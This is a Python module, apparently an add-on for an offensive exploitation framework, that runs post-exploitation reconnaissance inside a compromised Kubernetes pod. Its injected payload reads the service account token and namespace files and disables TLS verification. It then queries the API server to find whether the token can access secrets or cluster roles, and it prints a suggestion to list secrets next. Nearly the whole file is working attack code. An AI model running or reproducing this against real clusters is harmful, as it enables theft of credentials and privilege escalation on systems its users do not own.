import json

def run(exploit, *args):
    G, R, Y, B, C, M, N = "\033[92m", "\033[91m", "\033[93m", "\033[94m", "\033[96m", "\033[95m", "\033[0m"
    
    print(f"\n{B}[ K8S RBAC SWEEP: {C}url-shortener-sa{B} ]{N}")

    payload = (
        f"(lambda ns, token: (lambda conn: (conn.request('POST', '/apis/authorization.k8s.io/v1/selfsubjectrulesreviews', "
        f"body='{{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectRulesReview\",\"spec\":{{\"namespace\":\"' + ns + '\"}}}}', "
        f"headers={{'Authorization': 'Bearer ' + token, 'Content-Type': 'application/json'}}), "
        f"conn.getresponse().read().decode())[1])"
        f"(__import__('http.client').client.HTTPSConnection('kubernetes.default', context=__import__('ssl')._create_unverified_context())))"
        f"(open('/var/run/secrets/kubernetes.io/serviceaccount/namespace').read().strip(), "
        f"open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip())"
    )

    result = exploit.execute(payload)

    try:
        data = json.loads(result)
        rules = data.get('status', {}).get('resourceRules', [])
        found_verbs = {res: ",".join(r.get('verbs', [])) for res in ["secrets", "clusterroles"] 
                       for r in rules if res in r.get('resources', []) or '*' in r.get('resources', [])}

        interest = {"secrets": R, "clusterroles": M}
        for res, color in interest.items():
            if res in found_verbs:
                print(f" {G}●{N} {res:<20} {G}ALLOWED{N}")

        if "secrets" in found_verbs:
            print(f"\n {Y}Try: --addon k8s_list secrets{N}")

        if found_verbs:
            print(f"\n{C}--- FORENSIC ANALYSIS ---{N}")
            if "secrets" in found_verbs:
                print(f" [{R}!{N}] {R}CRITICAL{N}: Access to {Y}{found_verbs['secrets']}{N} secrets detected.")
            if "clusterroles" in found_verbs:
                print(f" [{M}!{N}] {M}HIGH{N}: Ability to {Y}{found_verbs['clusterroles']}{N} cluster-wide roles.")
            print("-" * 25)

    except Exception:
        print(f" {R}!!{N} Recon failed. Raw: {result[:100]}")

    print(f"\n{B}[ Operation Complete ]{N}\n")